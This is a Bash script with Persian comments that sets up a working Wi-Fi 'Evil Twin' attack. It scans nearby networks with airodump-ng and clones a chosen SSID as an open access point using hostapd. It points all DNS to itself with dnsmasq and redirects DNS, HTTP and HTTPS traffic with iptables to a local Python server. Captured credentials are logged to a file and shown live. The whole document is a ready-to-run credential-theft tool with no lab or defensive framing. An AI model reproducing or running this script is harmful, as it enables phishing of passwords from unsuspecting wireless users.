#!/bin/bash

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="${SCRIPT_DIR}/captured_credentials.log"
WIFI_INTERFACE=""
TARGET_SSID=""
NEW_CHANNEL=6

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

cleanup() {
    echo -e "\n${YELLOW}[+] در حال پاکسازی سیستم...${NC}"
    killall hostapd dnsmasq 2>/dev/null
    pkill -f "python3.*server.py" 2>/dev/null
    systemctl restart NetworkManager 2>/dev/null
    rm -f /tmp/scan-01.csv /tmp/hostapd.conf /tmp/dnsmasq.conf
    iptables -F
    iptables -t nat -F
    ip link set "${WIFI_INTERFACE}" down 2>/dev/null || true
    ip addr flush dev "${WIFI_INTERFACE}" 2>/dev/null || true
    echo -e "${GREEN}[+] پاکسازی انجام شد.${NC}"
    exit 0
}
trap cleanup EXIT INT

if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}❌ این اسکریپت باید با sudo اجرا شود.${NC}"
    exit 1
fi

# --- آزادسازی پورت 80 ---
echo -e "${YELLOW}[+] آزادسازی پورت 80...${NC}"
fuser -k 80/tcp 2>/dev/null
systemctl stop apache2 lighttpd nginx 2>/dev/null
sleep 1

# --- انتخاب کارت ---
echo -e "${GREEN}--- مرحله ۱: انتخاب کارت وایرلس ---${NC}"
mapfile -t interfaces < <(iw dev | grep Interface | awk '{print $2}')
if [ ${#interfaces[@]} -eq 0 ]; then
    echo -e "${RED}❌ کارت وایرلسی یافت نشد.${NC}"
    exit 1
fi
for i in "${!interfaces[@]}"; do
    echo "$((i+1))- ${interfaces[$i]}"
done
read -p "شماره کارت را وارد کنید: " choice
if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt ${#interfaces[@]} ]; then
    echo -e "${RED}❌ انتخاب نامعتبر.${NC}"
    exit 1
fi
WIFI_INTERFACE="${interfaces[$((choice-1))]}"
echo -e "${GREEN}✅ کارت انتخاب شده: ${WIFI_INTERFACE}${NC}"

# --- اسکن شبکه ---
echo -e "\n${GREEN}--- مرحله ۲: اسکن شبکه‌ها ---${NC}"
systemctl stop NetworkManager
killall wpa_supplicant hostapd dnsmasq 2>/dev/null
rfkill unblock wifi
ip link set "${WIFI_INTERFACE}" down
iw dev "${WIFI_INTERFACE}" set type managed
ip link set "${WIFI_INTERFACE}" up
sleep 2

airodump-ng --output-format csv --write /tmp/scan "${WIFI_INTERFACE}" &> /dev/null &
PID=$!
sleep 15
kill "${PID}" 2>/dev/null

mapfile -t ssids < <(awk -F, 'NF >= 14 && $1 != "BSSID" {gsub(/"/, "", $14); if ($14 != "") print $14}' /tmp/scan-01.csv | sort -u)
if [ ${#ssids[@]} -eq 0 ]; then
    echo -e "${RED}❌ شبکه‌ای یافت نشد.${NC}"
    exit 1
fi
for i in "${!ssids[@]}"; do
    clean_ssid=$(echo "${ssids[$i]}" | tr -d ' ')
    echo "$((i+1))- $clean_ssid"
done
read -p "شبکه هدف را انتخاب کنید: " choice
if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt ${#ssids[@]} ]; then
    echo -e "${RED}❌ انتخاب نامعتبر.${NC}"
    exit 1
fi
TARGET_SSID_RAW="${ssids[$((choice-1))]}"
TARGET_SSID=$(echo "$TARGET_SSID_RAW" | tr -d ' ')
SCAN_LINE=$(grep -F ",${TARGET_SSID_RAW}," /tmp/scan-01.csv | head -n 1)
TARGET_CHANNEL=$(echo "$SCAN_LINE" | awk -F, '{print $4}' | tr -d ' ')
if [ -z "$TARGET_CHANNEL" ]; then TARGET_CHANNEL=6; fi
if [ "$TARGET_CHANNEL" -le 6 ]; then NEW_CHANNEL=11; else NEW_CHANNEL=6; fi
echo -e "${GREEN}✅ شبکه: ${TARGET_SSID} | کانال: ${TARGET_CHANNEL} → AP در کانال ${NEW_CHANNEL}${NC}"

# --- راه‌اندازی Evil Twin ---
echo -e "\n${GREEN}--- مرحله ۳: راه‌اندازی Evil Twin ---${NC}"

# پاک کردن فایل لاگ قدیمی
rm -f "${LOG_FILE}"

# تنظیم کارت
ip link set "${WIFI_INTERFACE}" down
iw dev "${WIFI_INTERFACE}" set type __ap
ip addr flush dev "${WIFI_INTERFACE}"
ip addr add 10.0.0.1/24 dev "${WIFI_INTERFACE}"
ip link set "${WIFI_INTERFACE}" up
sleep 1

cat > /tmp/hostapd.conf <<EOF
interface=${WIFI_INTERFACE}
driver=nl80211
ssid=${TARGET_SSID}
hw_mode=g
channel=${NEW_CHANNEL}
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > /tmp/dnsmasq.conf <<EOF
interface=${WIFI_INTERFACE}
dhcp-range=10.0.0.50,10.0.0.150,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
address=/#/10.0.0.1
EOF

# --- راه‌اندازی سرور پایتونی از همان پوشه اصلی ---
echo -e "${YELLOW}[+] راه‌اندازی سرور HTTP...${NC}"
cd "${SCRIPT_DIR}" || exit 1

# اطمینان از وجود فایل
touch "${LOG_FILE}"
chmod 666 "${LOG_FILE}"

# راه‌اندازی سرور در پس‌زمینه
sudo python3 server.py &
SERVER_PID=$!
cd /tmp  # فقط برای اجرای سایر دستورات
sleep 2

if ! kill -0 "${SERVER_PID}" 2>/dev/null; then
    echo -e "${RED}❌ سرور پایتونی راه‌اندازی نشد!${NC}"
    exit 1
fi
echo -e "${GREEN}[+] سرور HTTP روی پورت 80 فعال شد.${NC}"

# iptables — اصلاح خطا: از ${WIFI_INTERFACE} در داخل کوتیشن استفاده شود
iptables -F
iptables -t nat -F
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -A PREROUTING -i "${WIFI_INTERFACE}" -p udp --dport 53 -j DNAT --to-destination 10.0.0.1
iptables -t nat -A PREROUTING -i "${WIFI_INTERFACE}" -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
iptables -t nat -A PREROUTING -i "${WIFI_INTERFACE}" -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
iptables -A FORWARD -i "${WIFI_INTERFACE}" -o ! "${WIFI_INTERFACE}" -j DROP

dnsmasq -C /tmp/dnsmasq.conf
hostapd /tmp/hostapd.conf &
sleep 3

echo -e "\n${GREEN}==================================================${NC}"
echo -e "${GREEN}✅ Evil Twin با موفقیت فعال شد!${NC}"
echo -e "SSID: ${YELLOW}${TARGET_SSID}${NC} | Channel: ${YELLOW}${NEW_CHANNEL}${NC}"
echo -e "\n${YELLOW}لاگ زنده ورودی‌ها:${NC}"
echo -e "${YELLOW}${LOG_FILE}${NC}"
echo -e "${RED}در حال نمایش... (برای توقف: Ctrl+C)${NC}"
echo -e "${GREEN}==================================================${NC}\n"

# دنبال کردن فایل لاگ
tail -f "${LOG_FILE}"
